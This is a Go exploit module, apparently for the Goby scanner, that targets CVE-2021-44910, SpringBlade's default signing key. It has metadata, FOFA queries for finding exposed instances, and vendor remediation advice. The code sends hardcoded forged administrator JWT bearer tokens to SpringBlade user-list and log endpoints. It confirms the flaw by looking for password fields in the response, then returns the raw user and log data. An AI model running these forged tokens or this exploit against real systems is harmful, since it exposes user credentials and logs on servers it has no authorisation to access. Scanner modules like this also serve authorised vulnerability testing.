package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SpringBlade Default SIGN_KRY vulnerability (CVE-2021-44910)",
    "Description": "<p>SpringBlade is a comprehensive project that coexists with the SpringCloud distributed microservice architecture and the SpringBoot monolithic microservice architecture upgraded and optimized from commercial-grade projects.</p><p>The SpringBlade framework has a default SIGN_KEY, and attackers can exploit the vulnerability to obtain sensitive information such as user account password logs.</p>",
    "Impact": "<p>SpringBlade Default SIGN_KRY (CVE-2021-44910)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/chillzhuang/blade-tool\">https://github.com/chillzhuang/blade-tool</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "SpringBlade",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "SpringBlade 框架默认 SIGN_KRY 秘钥漏洞（CVE-2021-44910）",
            "Product": "SpringBlade",
            "Description": "<p>SpringBlade 是一个由商业级项目升级优化而来的SpringCloud分布式微服务架构、SpringBoot单体式微服务架构并存的综合型项目。</p><p>SpringBlade 框架存在默认SIGN_KEY，攻击者可利用漏洞获取用户账号密码日志等敏感信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/chillzhuang/blade-tool\">https://github.com/chillzhuang/blade-tool</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>SpringBlade 框架存在默认SIGN_KEY，攻击者可利用漏洞获取用户账号密码日志等敏感信息。</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "SpringBlade Default SIGN_KRY vulnerability (CVE-2021-44910)",
            "Product": "SpringBlade",
            "Description": "<p>SpringBlade is a comprehensive project that coexists with the SpringCloud distributed microservice architecture and the SpringBoot monolithic microservice architecture upgraded and optimized from commercial-grade projects.</p><p>The SpringBlade framework has a default SIGN_KEY, and attackers can exploit the vulnerability to obtain sensitive information such as user account password logs.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/chillzhuang/blade-tool\">https://github.com/chillzhuang/blade-tool</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>SpringBlade Default SIGN_KRY (CVE-2021-44910)</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "body=\"saber/iconfont.css\" || body=\"Saber 将不能正常工作\"||title=\"Sword Admin\"||body=\"We're sorry but avue-data doesn't work\"",
    "GobyQuery": "body=\"saber/iconfont.css\" || body=\"Saber 将不能正常工作\"||title=\"Sword Admin\"||body=\"We're sorry but avue-data doesn't work\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://github.com/chillzhuang/blade-tool",
    "DisclosureDate": "2022-03-14",
    "References": [
        "https://forum.butian.net/share/973"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [
        "CVE-2021-44910"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "createSelect",
            "value": "api/blade-log/api/list,api/blade-user/user-list",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10261"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri2 := "/api/blade-user/user-list"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			cfg2.Header.Store("Blade-Auth", "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSJ9.-XHkGTDfmGOdB8DNKwcCgWIfcR8Ln4hs09CVDslv1ATodR2Mjmjrq6KCysoK-sw3zf2EwATzdgxGXNGxfmj9wg")
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "\"code\":200") && strings.Contains(resp2.RawBody, "password") {
					return true
				}
			}
			uri3 := "/api/blade-user/user-list"
			cfg3 := httpclient.NewGetRequestConfig(uri3)
			cfg3.VerifyTls = false
			cfg3.FollowRedirect = false
			cfg3.Header.Store("Blade-Auth", "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ")
			if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
				if resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, "\"code\":200") && strings.Contains(resp3.RawBody, "password") {
					return true
				}
			}
			uri1 := "/api/blade-log/api/list"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Blade-Auth", "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSJ9.-XHkGTDfmGOdB8DNKwcCgWIfcR8Ln4hs09CVDslv1ATodR2Mjmjrq6KCysoK-sw3zf2EwATzdgxGXNGxfmj9wg")
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "\"code\":200") && strings.Contains(resp1.RawBody, "params") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Blade-Auth", "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsImV4cCI6MTY0NzI2ODA4OSwibmJmIjoxNjQ3MjY0NDg5fQ.08629XVY-36FNlFr-CsAO7ukVcwJVZ4Kzs_JTXnThyfA-ZYLPLDaydRHGxL7LzV8V5uWBTW-tLXNURm-2NYuJg")
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			uri1 := "/" + cmd
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.Header.Store("Blade-Auth", "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ")
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					expResult.Output = resp1.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
